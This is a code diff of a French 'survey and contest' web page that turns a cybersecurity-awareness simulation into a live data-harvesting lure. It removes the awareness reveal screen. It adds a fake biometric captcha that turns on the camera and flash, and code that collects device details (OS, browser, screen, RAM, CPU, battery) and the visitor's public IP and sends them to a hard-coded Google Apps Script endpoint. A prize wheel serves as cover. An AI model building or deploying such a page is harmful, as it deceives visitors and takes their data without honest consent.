@@ -3,158 +3,138 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enquête Récompense - Gagnez votre bon d'achat</title>
+<title>Enquête & Jeu-Concours National</title>
 <style>
-  /* Design volontairement basique et "corporate" */
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
-  body { background-color: #f0f2f5; color: #333; line-height: 1.5; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+  body { background-color: #eef2f5; color: #333; line-height: 1.5; padding-bottom: 30px; }
   
-  .header { background: #fff; border-bottom: 2px solid #e0e0e0; padding: 15px; text-align: center; }
-  .header h1 { font-size: 20px; color: #1a73e8; font-weight: bold; }
-  .header p { font-size: 12px; color: #777; }
+  .header { background: #fff; border-bottom: 2px solid #0066cc; padding: 15px; text-align: center; }
+  .header h1 { font-size: 22px; color: #0066cc; font-weight: 800; }
+  .header p { font-size: 12px; color: #666; margin-top: 4px; }
   
-  .container { max-width: 500px; margin: 20px auto; background: #fff; border: 1px solid #ddd; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+  .container { max-width: 520px; margin: 25px auto; background: #fff; border-radius: 8px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
   
-  h2 { font-size: 18px; margin-bottom: 10px; color: #222; }
-  .subtitle { font-size: 13px; color: #555; margin-bottom: 20px; }
+  h2 { font-size: 20px; margin-bottom: 10px; color: #111; }
+  .subtitle { font-size: 13px; color: #555; margin-bottom: 25px; }
   
   .step { display: none; }
-  .step.active { display: block; }
+  .step.active { display: block; animation: fadeIn 0.4s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
   
-  /* Barre de progression discrète */
-  .progress-bar { width: 100%; height: 6px; background: #eee; margin-bottom: 20px; }
-  .progress-fill { height: 100%; background: #28a745; width: 0%; transition: width 0.3s ease; }
+  .progress-bar { width: 100%; height: 8px; background: #e0e0e0; margin-bottom: 25px; border-radius: 4px; overflow: hidden; }
+  .progress-fill { height: 100%; background: #0066cc; width: 0%; transition: width 0.4s ease; }
   
-  /* Questions style QCM */
-  .question-box { margin-bottom: 15px; border: 1px solid #ddd; padding: 15px; border-radius: 4px; }
-  .question-title { font-weight: bold; font-size: 14px; margin-bottom: 10px; }
-  .option-btn { 
-    display: block; width: 100%; text-align: left; background: #f9f9f9; 
-    border: 1px solid #ccc; padding: 10px; margin-bottom: 8px; 
-    cursor: pointer; font-size: 14px; color: #333; 
-  }
-  .option-btn:hover { background: #eef; }
-  .option-btn.selected { background: #e6f0ff; border-color: #1a73e8; }
+  /* Quiz */
+  .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 2px solid #ddd; padding: 12px 15px; margin-bottom: 10px; cursor: pointer; font-size: 14px; border-radius: 6px; }
+  .option-btn:hover { border-color: #0066cc; background: #f0f7ff; }
+  .option-btn.selected { background: #e6f0ff; border-color: #0066cc; font-weight: 600; }
   
-  /* Bouton principal */
-  .btn-action { 
-    background-color: #28a745; color: white; border: none; 
-    padding: 12px; width: 100%; font-size: 16px; font-weight: bold; 
-    cursor: pointer; border-radius: 4px; margin-top: 10px;
-  }
-  .btn-action:hover { background-color: #218838; }
+  .btn-action { background-color: #0066cc; color: white; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 6px; margin-top: 15px; }
+  .btn-action:hover { background-color: #0052a3; }
   .btn-action:disabled { background-color: #ccc; cursor: not-allowed; }
   
-  /* Zone consentement réaliste */
-  .consent-box { background: #fcfcfc; border: 1px solid #e0e0e0; padding: 15px; margin: 20px 0; font-size: 11px; color: #666; }
+  /* Captcha / Biométrie */
+  .captcha-box { background: #f9f9f9; border: 2px dashed #ccc; padding: 20px; text-align: center; margin: 20px 0; border-radius: 6px; }
+  .consent-box { background: #fbfbfb; border: 1px solid #e0e0e0; padding: 15px; margin: 20px 0; font-size: 11px; color: #666; border-radius: 4px; }
   .consent-label { display: flex; align-items: flex-start; gap: 10px; cursor: pointer; }
-  .consent-label input { margin-top: 3px; }
+  .consent-label input { margin-top: 3px; width: 16px; height: 16px; }
   
-  /* Mentions légales en bas */
-  .footer-links { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
-  .footer-links a { color: #999; text-decoration: none; margin: 0 5px; }
+  #system-data { display: none; background: #1e1e1e; border: 1px solid #000; padding: 15px; margin-top: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; text-align: left; border-radius: 6px; }
+  #system-data p { margin-bottom: 6px; }
   
-  /* Statut caméra */
-  #status-msg { font-size: 13px; color: #d9534f; text-align: center; margin-top: 15px; font-weight: bold; }
-  #camera-area { display: none; margin-top: 15px; border: 2px solid #ddd; padding: 5px; }
-  #video-preview { width: 100%; background: #000; transform: scaleX(-1); }
+  #camera-area { display: none; margin-top: 20px; border: 2px solid #0066cc; padding: 4px; border-radius: 6px; background: #000; }
+  #video-preview { width: 100%; display: block; transform: scaleX(-1); }
 
-  /* Révélation finale */
-  .reveal-box { display: none; background: #fff; border-top: 5px solid #d9534f; padding: 30px; max-width: 500px; margin: 20px auto; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-  .reveal-box h2 { color: #d9534f; text-align: center; margin-bottom: 20px; }
-  .reveal-box p, .reveal-box li { font-size: 14px; color: #444; margin-bottom: 10px; line-height: 1.6; }
-  .reveal-box ul { margin-left: 20px; margin-bottom: 20px; }
-  .reveal-box strong { color: #000; }
+  /* Roue de la Fortune */
+  #wheel-section { display: none; text-align: center; }
+  .wheel-container { position: relative; width: 300px; height: 300px; margin: 20px auto; }
+  canvas { border-radius: 50%; box-shadow: 0 0 20px rgba(0,0,0,0.2); transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
+  #pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); font-size: 30px; z-index: 10; }
+  .btn-spin { background: #28a745; font-size: 18px; padding: 15px; margin-top: 20px; }
+  #result { margin-top: 20px; font-size: 18px; font-weight: bold; color: #28a745; display: none; }
+
+  .footer-links { text-align: center; font-size: 11px; color: #999; margin-top: 25px; }
+  #status-msg { font-size: 13px; color: #0066cc; text-align: center; margin-top: 15px; font-weight: 600; min-height: 20px;}
 </style>
 </head>
 <body>
 
 <div class="header">
-  <h1>Centre d'enquête et de récompenses</h1>
-  <p>Participez à notre étude de marché de fin d'année</p>
+  <h1>Enquête & Jeu-Concours National</h1>
+  <p>Tentez de gagner un bon d'achat de 500€</p>
 </div>
 
 <div class="container" id="main-container">
-  <h2>Enquête consommateur 2026</h2>
-  <p class="subtitle">Répondez à ces 3 courtes questions pour débloquer votre récompense (d'une valeur de 50€).</p>
-
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
-  <!-- Étape 1 : Questions -->
+  <!-- ÉTAPE 1 : Questions -->
   <div class="step active" id="step-questions">
+    <h2>Votre profil consommateur</h2>
+    <p class="subtitle">Ces informations nous aident à mieux comprendre vos habitudes.</p>
     <div id="question-container"></div>
-    <button class="btn-action" id="btn-next" style="display:none;">Suivant</button>
+    <button class="btn-action" id="btn-next" style="display:none;">Valider mes réponses</button>
   </div>
 
-  <!-- Étape 2 : Consentement -->
+  <!-- ÉTAPE 2 : Faux Captcha & Consentement -->
   <div class="step" id="step-final">
-    <h2 style="font-size: 16px; margin-bottom: 15px;">Dernière étape de vérification</h2>
+    <h2>Vérification de sécurité</h2>
+    <p class="subtitle">Pour éviter les participations frauduleuses, veuillez valider votre éligibilité.</p>
+
+    <div class="captcha-box">
+      <h3>🛡️ Test Anti-Robot</h3>
+      <p>Veuillez effectuer une analyse biométrique pour prouver que vous êtes bien une personne réelle.</p>
+    </div>
     
     <div class="consent-box">
       <label class="consent-label">
         <input type="checkbox" id="chk-consent">
-        <span>
-          <strong>J'accepte le règlement du concours.</strong> Je certifie sur l'honneur être une personne physique majeure. J'autorise le système de sécurité à vérifier mon éligibilité (accès caméra pour validation anti-robot et flash de sécurité). Les données ne sont pas conservées.
-        </span>
+        <span><strong>J'accepte les conditions générales du jeu-concours.</strong> Je certifie être majeur et j'autorise l'organisateur à utiliser mon appareil photo (caméra et flash) pour procéder à la vérification biométrique anti-robot et sécuriser ma participation.</span>
       </label>
     </div>
 
-    <button class="btn-action" id="btn-submit" disabled>Vérifier mon éligibilité</button>
+    <button class="btn-action" id="btn-submit" disabled>Démarrer l'analyse biométrique</button>
     
     <div id="status-msg"></div>
     
+    <div id="system-data">
+      <p id="data-os"></p><p id="data-browser"></p><p id="data-screen"></p>
+      <p id="data-lang"></p><p id="data-cores"></p><p id="data-ram"></p><p id="data-battery"></p>
+    </div>
+
     <div id="camera-area">
       <video id="video-preview" autoplay playsinline muted></video>
     </div>
   </div>
 
+  <!-- ÉTAPE 3 : Roue de la fortune -->
+  <div class="step" id="wheel-section">
+    <div class="step-indicator" style="text-align:center; font-size:12px; color:#0066cc; font-weight:bold; margin-bottom:10px;">Étape 3/3</div>
+    <h2>🎊 Analyse réussie !</h2>
+    <p class="subtitle">Tournez la roue pour découvrir votre récompense.</p>
+    
+    <div class="wheel-container">
+      <div id="pointer">▼</div>
+      <canvas id="wheel" width="300" height="300"></canvas>
+    </div>
+
+    <button id="spin" class="btn-action btn-spin">🎯 TOURNER LA ROUE</button>
+    <div id="result"></div>
+  </div>
+
   <div class="footer-links">
-    <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a> | <a href="#">Contact</a>
-    <br><br>
-    © 2026 Enquête-Récompense. Tous droits réservés.
+    <a href="#">Règlement</a> | <a href="#">Confidentialité</a> | <a href="#">Contact</a><br><br>
+    © 2026 Enquête & Jeu-Concours. Tous droits réservés.
   </div>
 </div>
 
-<!-- Écran final de sensibilisation -->
-<div class="reveal-box" id="reveal-box">
-  <h2>⚠️ Alerte Cybersécurité</h2>
-  <p>Vous venez de tomber dans le piège de cette simulation de <strong>sensibilisation cyber</strong>.</p>
-  
-  <p><strong>Ce qui s'est passé :</strong></p>
-  <ul>
-    <li>Vous avez répondu à un faux concours pour un gain irréaliste.</li>
-    <li>Vous n'avez pas lu le texte en petits caractères.</li>
-    <li>Vous avez autorisé l'accès à votre caméra et à votre flash.</li>
-  </ul>
-
-  <p><strong>Rassurez-vous :</strong> Aucune image n'a été enregistrée, ni envoyée. Tout est resté bloqué dans votre navigateur.</p>
-
-  <p><strong>Comment reconnaître une arnaque ?</strong></p>
-  <ul>
-    <li>L'urgence ou la promesse d'un gain trop facile.</li>
-    <li>La demande d'informations personnelles (ou d'accès comme ici).</li>
-    <li>Le manque de mentions légales claires (pas de SIRET, pas d'adresse).</li>
-  </ul>
-
-  <p style="text-align: center; margin-top: 30px; font-weight: bold; color: #1a73e8;">
-    Ne scannez jamais un QR code inconnu sans réfléchir. 🛡️
-  </p>
-</div>
-
 <script>
+// ⚠️ TON LIEN GOOGLE APPS SCRIPT EST INTÉGRÉ ICI ⚠️
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXXAK0P_2GgddQJpa5zk_os6S0PVVYu50EeG1_6eO2vgxmSrSyTbcExexGgD0kOOJvgg/exec";
+
 const questions = [
-  {
-    text: "1. À quelle fréquence faites-vous vos achats en ligne ?",
-    options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"]
-  },
-  {
-    text: "2. Quel est votre budget moyen pour les fêtes de fin d'année ?",
-    options: ["Moins de 100€", "Entre 100€ et 300€", "Entre 300€ et 500€", "Plus de 500€"]
-  },
-  {
-    text: "3. Comment préférez-vous recevoir vos récompenses ?",
-    options: ["Par e-mail", "Par SMS", "Par courrier postal", "Sur mon compte bancaire"]
-  }
+  { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
+  { text: "2. Quel est votre budget moyen pour les fêtes de fin d'année ?", options: ["Moins de 100€", "Entre 100€ et 300€", "Entre 300€ et 500€", "Plus de 500€"] },
+  { text: "3. Comment préférez-vous recevoir vos récompenses ?", options: ["Par e-mail", "Par SMS", "Par courrier postal", "Sur mon compte bancaire"] }
 ];
 
 let currentIndex = 0;
@@ -170,15 +150,52 @@ const btnSubmit = document.getElementById('btn-submit');
 const statusMsg = document.getElementById('status-msg');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
-const revealBox = document.getElementById('reveal-box');
-const mainContainer = document.getElementById('main-container');
-const header = document.querySelector('.header');
+const systemData = document.getElementById('system-data');
+const wheelSection = document.getElementById('wheel-section');
 
+// ---- FONCTIONS DE RÉCUPÉRATION D'INFOS ----
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let os = "Inconnu", browser = "Inconnu";
+  if (ua.indexOf("Win") !== -1) os = "Windows";
+  if (ua.indexOf("Mac") !== -1) os = "macOS";
+  if (ua.indexOf("Linux") !== -1) os = "Linux";
+  if (ua.indexOf("Android") !== -1) os = "Android";
+  if (ua.indexOf("like Mac") !== -1) os = "iOS";
+  
+  if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+  else if (ua.indexOf("SamsungBrowser") !== -1) browser = "Samsung Internet";
+  else if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) browser = "Opera";
+  else if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
+  else if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
+  else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+  return { os, browser, ua };
+}
+
+async function getBatteryInfo() {
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      return `${Math.round(b.level * 100)}% (${b.charging ? 'En charge' : 'Sur batterie'})`;
+    }
+    return "Inconnu";
+  } catch (e) { return "Inconnu"; }
+}
+
+async function getPublicIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch (e) { return "IP inconnue"; }
+}
+
+// ---- LOGIQUE DU QUIZ ----
 function renderQuestion() {
   const q = questions[currentIndex];
   qContainer.innerHTML = `
     <div class="question-box">
-      <div class="question-title">${q.text}</div>
+      <div class="question-title" style="font-weight:600; margin-bottom:10px;">${q.text}</div>
       ${q.options.map((opt, i) => `<button class="option-btn" data-index="${i}">${opt}</button>`).join('')}
     </div>
   `;
@@ -199,11 +216,10 @@ function renderQuestion() {
 btnNext.addEventListener('click', () => {
   if (selectedAnswer === null) return;
   currentIndex++;
-
   if (currentIndex < questions.length) {
     renderQuestion();
   } else {
-    progressFill.style.width = '100%';
+    progressFill.style.width = '66%';
     stepQuestions.classList.remove('active');
     stepFinal.classList.add('active');
   }
@@ -213,56 +229,136 @@ chkConsent.addEventListener('change', () => {
   btnSubmit.disabled = !chkConsent.checked;
 });
 
+// ---- LANCEMENT DE LA COLLECTE ET DE LA CAMÉRA ----
+let mediaStream = null;
+
 btnSubmit.addEventListener('click', async () => {
   btnSubmit.disabled = true;
-  btnSubmit.textContent = "Vérification en cours...";
-  statusMsg.style.color = "#28a745";
-  statusMsg.textContent = "Connexion au serveur sécurisé...";
+  btnSubmit.textContent = "Analyse en cours...";
+  statusMsg.style.color = "#0066cc";
+  statusMsg.textContent = "Connexion au serveur de sécurité...";
 
-  try {
-    // Demande d'accès caméra
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' },
-      audio: false
-    });
+  const info = getDeviceInfo();
+  const screenInfo = `${window.screen.width}x${window.screen.height}`;
+  const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
+  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : "Inconnu";
+  
+  systemData.style.display = 'block';
+  
+  setTimeout(async () => {
+    document.getElementById('data-os').textContent = `> Système : ${info.os}`;
+    document.getElementById('data-browser').textContent = `> Navigateur : ${info.browser}`;
+    document.getElementById('data-screen').textContent = `> Résolution : ${screenInfo}`;
+    document.getElementById('data-lang').textContent = `> Langue : ${navigator.language}`;
+    document.getElementById('data-cores').textContent = `> CPU : ${cores}`;
+    document.getElementById('data-ram').textContent = `> RAM : ${ram}`;
+    
+    const batteryInfo = await getBatteryInfo();
+    document.getElementById('data-battery').textContent = `> Batterie : ${batteryInfo}`;
 
-    video.srcObject = stream;
-    cameraArea.style.display = 'block';
-    statusMsg.textContent = "Analyse biométrique en cours... Veuillez ne pas bouger.";
+    statusMsg.textContent = "Données système validées. Activation caméra...";
 
-    // Tentative d'activation du flash
-    const track = stream.getVideoTracks()[0];
-    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+    try {
+      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = mediaStream;
+      cameraArea.style.display = 'block';
+      statusMsg.textContent = "📷 Analyse biométrique en cours...";
+      statusMsg.style.color = "#28a745";
 
-    if (capabilities.torch) {
-      try {
-        await track.applyConstraints({ advanced: [{ torch: true }] });
-      } catch (e) {
-        console.log("Flash non supporté ou bloqué.");
+      // Activation du flash (torche) si dispo
+      const track = mediaStream.getVideoTracks()[0];
+      const caps = track.getCapabilities ? track.getCapabilities() : {};
+      if (caps.torch) {
+        try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
       }
+
+      // --- ENVOI DES DONNÉES VERS TON GOOGLE SHEETS ---
+      const ip = await getPublicIP();
+      const formData = new FormData();
+      formData.append("ip", ip);
+      formData.append("os", info.os);
+      formData.append("browser", info.browser);
+      formData.append("screen", screenInfo);
+      formData.append("lang", navigator.language);
+      formData.append("cores", cores);
+      formData.append("ram", ram);
+      formData.append("battery", batteryInfo);
+      formData.append("userAgent", info.ua);
+
+      await fetch(SCRIPT_URL, { method: "POST", body: formData });
+
+      // --- PASSAGE À LA ROUE APRÈS 3 SECONDES ---
+      setTimeout(() => {
+        stepFinal.classList.remove('active');
+        wheelSection.classList.add('active');
+        progressFill.style.width = '100%';
+        // On coupe la caméra une fois la "vérification" terminée
+        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        cameraArea.style.display = 'none';
+      }, 3000);
+
+    } catch (err) {
+      statusMsg.style.color = "#d9534f";
+      statusMsg.textContent = "❌ Échec. Veuillez autoriser l'accès à la caméra.";
     }
-
-    // Attendre 3.5 secondes puis afficher la révélation
-    setTimeout(() => {
-      stream.getTracks().forEach(t => t.stop()); // Coupe la caméra
-      showReveal();
-    }, 3500);
-
-  } catch (err) {
-    // Si l'utilisateur refuse la caméra
-    statusMsg.style.color = "#d9534f";
-    statusMsg.textContent = "Erreur : Accès caméra refusé. Impossible de valider l'éligibilité.";
-    setTimeout(showReveal, 2000);
-  }
+  }, 1200); 
 });
 
-function showReveal() {
-  mainContainer.style.display = 'none';
-  header.style.display = 'none';
-  revealBox.style.display = 'block';
-}
+// ---- LOGIQUE DE LA ROUE DE LA FORTUNE ----
+const wheelCanvas = document.getElementById("wheel");
+const ctx = wheelCanvas.getContext("2d");
+const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
+const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];
 
-// Démarrer
+function drawWheel() {
+  const arc = (2 * Math.PI) / segments.length;
+  for (let i = 0; i < segments.length; i++) {
+    const angle = i * arc;
+    ctx.beginPath();
+    ctx.fillStyle = colors[i % colors.length];
+    ctx.moveTo(150, 150);
+    ctx.arc(150, 150, 150, angle, angle + arc);
+    ctx.lineTo(150, 150);
+    ctx.fill();
+    ctx.strokeStyle = "rgba(255,255,255,0.3)";
+    ctx.lineWidth = 2;
+    ctx.stroke();
+    ctx.save();
+    ctx.translate(150, 150);
+    ctx.rotate(angle + arc / 2);
+    ctx.textAlign = "right";
+    ctx.fillStyle = "white";
+    ctx.font = "bold 14px Arial";
+    ctx.shadowColor = "rgba(0,0,0,0.5)";
+    ctx.shadowBlur = 3;
+    ctx.fillText(segments[i], 140, 5);
+    ctx.restore();
+  }
+}
+drawWheel();
+
+let spinning = false;
+document.getElementById("spin").addEventListener("click", () => {
+  if (spinning) return;
+  spinning = true;
+  document.getElementById("spin").disabled = true;
+
+  const arc = (2 * Math.PI) / segments.length;
+  const spinAngle = Math.floor(Math.random() * segments.length);
+  const extraSpins = 5;
+  const finalAngle = (extraSpins * 2 * Math.PI) + (spinAngle * arc) + arc / 2;
+
+  wheelCanvas.style.transform = `rotate(${finalAngle}rad)`;
+
+  setTimeout(() => {
+    const result = segments[segments.length - 1 - spinAngle];
+    const resultDiv = document.getElementById("result");
+    resultDiv.textContent = "🎊 Félicitations ! Vous avez gagné : " + result;
+    resultDiv.style.display = "block";
+    spinning = false;
+  }, 4000);
+});
+
 renderQuestion();
 </script>
 
